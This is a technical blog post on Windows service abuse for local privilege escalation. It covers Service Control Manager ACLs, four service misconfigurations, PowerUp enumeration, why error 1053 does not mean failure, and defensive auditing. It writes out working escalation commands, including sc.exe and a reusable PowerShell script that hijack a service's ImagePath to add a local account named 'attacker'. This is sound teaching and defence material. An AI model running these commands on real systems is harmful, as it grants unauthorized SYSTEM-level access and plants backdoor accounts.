---
title: Windows Services and Service Abuse
layout: post
date: 2026-09-08
description: "How the Service Control Manager decides who may reconfigure a service, the four distinct misconfigurations that turn an ordinary service into a local privilege escalation, and why SCM error 1053 does not mean the payload failed."
permalink: /theory/windows/services/
---

# Windows Services and Service Abuse

## Overview

A Windows **service** is a process the operating system starts on its own behalf, usually before anyone logs on, usually under a privileged identity. That combination is what makes services the single richest source of local privilege escalation on Windows: a service is a piece of *configuration* that says "run this command line as this account", and configuration lives in a place that has an ACL.

If a low privileged account can influence any part of that configuration, or any part of what the configuration points at, it can make `LocalSystem` run its code. Everything below is a variation on that one sentence.

## The Service Control Manager

The **Service Control Manager** (SCM, `services.exe`) owns every service on the machine. It reads service definitions from the registry, starts and stops them, and exposes an RPC interface that `sc.exe`, `Get-Service`, and the Services MMC snap-in all talk to.

Each service is a key under:

```text
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
```

The values that matter for abuse are:

| Value | Meaning |
|---|---|
| `ImagePath` | Command line SCM executes |
| `ObjectName` | Account the process runs as |
| `Start` | Boot / Auto / Manual / Disabled |
| `Type` | Own process, shared process, driver |
| `DependOnService` | Services started first |

`ObjectName` is usually `LocalSystem`, `NT AUTHORITY\LocalService`, `NT AUTHORITY\NetworkService`, or a named domain account. `LocalSystem` is the most privileged identity on the box, and it is the default for a large fraction of the services Windows ships.

> Note that the on-disk name and the display name are different things. `wuauserv` is the service name; "Windows Update" is the display name. SCM APIs take the service name, so that is the one worth writing down.
{: .prompt-info }

## Two ACLs, Not One

There are two independent security descriptors in play, and confusing them is the most common source of "this should have worked" moments.

1. **The service object's DACL**, held by SCM. It grants rights like `SERVICE_QUERY_CONFIG`, `SERVICE_CHANGE_CONFIG`, `SERVICE_START`, `SERVICE_STOP`. Read it with:

   ```powershell
   sc.exe sdshow <ServiceName>
   ```

2. **The DACL on the objects the configuration references**: the binary on disk, the directory containing it, the registry key itself.

An account can hold write access to one and not the other. Holding `SERVICE_CHANGE_CONFIG` lets you rewrite `ImagePath` even if you cannot touch the executable; holding write on the executable lets you replace the file even if SCM will not let you reconfigure the service.

The rights that matter, in SDDL shorthand as `sc.exe sdshow` prints them:

| SDDL | Right | Why it matters |
|---|---|---|
| `CC` | Query config | Read `ImagePath` |
| `DC` | Change config | Rewrite `ImagePath` and `ObjectName` |
| `LC` | Query status | Poll state |
| `RP` | Start | Trigger execution |
| `WP` | Stop | Free the process for restart |
| `WD` | Write DACL | Grant yourself everything else |
| `WO` | Write owner | Take the object |

`DC` plus `RP` (or `DC` plus `WP` and `RP`) is a complete escalation. Everything else is detail.

## The Four Misconfigurations

### 1. Weak service DACL

The service object itself grants `SERVICE_CHANGE_CONFIG` to a group that contains ordinary users. Rewrite `ImagePath` to a command of your choice, restart the service, restore the original path.

```powershell
sc.exe config <ServiceName> binPath= "C:\Windows\System32\cmd.exe /c net user attacker P@ssw0rd! /add"
sc.exe stop <ServiceName>
sc.exe start <ServiceName>
sc.exe config <ServiceName> binPath= "<original path>"
```

This is the cleanest of the four because it needs no file write anywhere and leaves no artifact once the original path is restored.

### 2. Weak permissions on the service binary

The service DACL is fine, but `BUILTIN\Users` holds `(M)` or `(F)` on the executable the service runs. Replace the file and wait for, or trigger, a restart.

```powershell
icacls "C:\Program Files\Vendor\service.exe"
```

Because SCM launches the `ImagePath` target as a process, a file dropped here must be a real PE image, not a shell one-liner.

### 3. Unquoted service path

If `ImagePath` is `C:\Program Files\Some Vendor\service.exe` **without quotes**, `CreateProcess` walks the ambiguity from left to right and tries, in order:

```text
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Vendor\service.exe
```

Any of those earlier candidates that an attacker can create becomes the service binary. This one needs write access to a directory in the path, not to the service.

### 4. Weak permissions on the registry key

Write access to `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>` is equivalent to `SERVICE_CHANGE_CONFIG`, because that key *is* the configuration. SCM re-reads it on the next start.

## Finding Them

[PowerUp](https://github.com/PowerShellMafia/PowerSploit), from PowerSploit, checks all four in one pass:

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

The service related findings come back as `ModifiableService`, `ModifiableServiceFile`, and `UnquotedService` objects, each with an `AbuseFunction` field naming the helper that weaponises it (`Invoke-ServiceAbuse`, `Write-ServiceBinary`, `Install-ServiceBinary`).

The important caveat is that **PowerUp's enumeration is only as good as the token it runs under.** It calls `Get-WmiObject win32_service` and opens SCM with `OpenSCManager`, and both of those access checks are evaluated against the SIDs in the current access token. A pure network logon (logon type 3, which is what WinRM gives you) frequently cannot open SCM for enumeration at all:

```text
Get-WmiObject win32_service: Access denied
Get-Service: Cannot open Service Control Manager on computer '.'
```

That is not evidence that no vulnerable service exists. It is evidence that this token cannot see the answer. Re-authenticating the *same account* with an interactive logon, for example through [RunasCs](https://github.com/antonioCoco/RunasCs) with `-l 2`, produces a token with a different SID set and often makes the same enumeration succeed. See [Logon Types and Privileges](/theory/windows/logon-and-privileges/) for why the account name is not the security context.

## Error 1053 Is Not a Failure

When you point `ImagePath` at `cmd.exe`, `powershell.exe`, or any other normal console program and start the service, SCM will report:

```text
The service did not respond to the start or control request in a timely fashion
```

That is error **1053**, and it is the expected outcome. A real service process is required to call `StartServiceCtrlDispatcher` within roughly 30 seconds so SCM can register its control handler. `cmd.exe` never does that, so SCM eventually gives up on the handshake and kills the process.

But the sequence matters. SCM **creates the process first**, under the service's configured identity, and only then waits for the handshake. By the time the timeout fires, your payload has already run as `LocalSystem`. The correct test is never the return code of `Start-Service`; it is an observable side effect:

```powershell
net user attacker
net localgroup Administrators
Get-Content C:\proof.txt
```

Two practical consequences follow:

- Anything that needs shell semantics (redirection, `&&`, environment expansion) must be wrapped in `cmd.exe /c`, because SCM calls `CreateProcess` and does not interpret metacharacters.
- Keep the payload short and use absolute paths. `C:\Windows\System32\cmd.exe` and `C:\Windows\System32\net.exe` resolve regardless of the service's `PATH`, and a long command line is the usual reason an abuse "silently" does nothing.

> Changing the `ImagePath` of a real operating system service, `wuauserv` or anything else in `netsvcs`, is a destructive act on a shared component. Always capture the original value first and restore it in a `finally` block, and verify the restore afterwards with `(Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\<name>).ImagePath`.
{: .prompt-warning }

## Reusable Abuse Pattern

```powershell
. .\PowerUp.ps1

$svc  = Get-Service <ServiceName>
$orig = ($svc | Get-ServiceDetail).PathName

try {
    $payload = 'C:\Windows\System32\cmd.exe /c C:\Windows\System32\net.exe user attacker P@ssw0rd! /add>C:\u.log 2>&1'
    $svc | Stop-Service -Force
    $svc | Set-ServiceBinPath -binPath $payload
    $svc | Start-Service -ErrorAction SilentlyContinue
    Start-Sleep 2
}
finally {
    $svc | Stop-Service -Force -ErrorAction SilentlyContinue
    $svc | Set-ServiceBinPath -binPath $orig
}

net user attacker
(Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName>).ImagePath
```

`Invoke-ServiceAbuse` automates the same shape, but it calls `Start-Service` with `-ErrorAction SilentlyContinue` and returns an object describing the command it *attempted*. That object is not proof of execution, which is why the manual form above is worth knowing.

## Defence

- Audit service DACLs, not just file permissions. `SERVICE_CHANGE_CONFIG` granted to `Authenticated Users` or `BUILTIN\Users` is a full local escalation regardless of how the binary is protected.
- Quote every `ImagePath` that contains a space, and keep service binaries outside user writable directories.
- Run services under the least privileged identity that works. Virtual accounts (`NT SERVICE\<ServiceName>`) and managed service accounts scope the blast radius; `LocalSystem` does not.
- Alert on `ImagePath` changes. Registry auditing on `HKLM\SYSTEM\CurrentControlSet\Services` and Windows event ID `7045` (new service) plus `4697` (service installed) catch the loud half; a temporary reconfigure and restore of an existing service catches only if you watch the value itself.

## Examples on this site

Boxes that abuse a service misconfiguration, listed automatically from their tags (add a matching tag to `svc_tags` below to include a new one):

{% assign svc_tags = "weak-service-permissions" | split: "," -%}
{% for post in site.posts -%}
{%- assign match = false -%}
{%- for t in post.tags -%}
{%- if svc_tags contains t -%}{%- assign match = true -%}{%- endif -%}
{%- endfor -%}
{%- if match %}
- [{{ post.title }}]({{ post.url }}){% endif -%}
{%- endfor %}

## References

- [Microsoft - Service Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)
- [Microsoft - Service Control Manager](https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager)
- [harmj0y - PowerUp](https://github.com/PowerShellMafia/PowerSploit)
- [Microsoft - StartServiceCtrlDispatcher](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicectrldispatcherw)
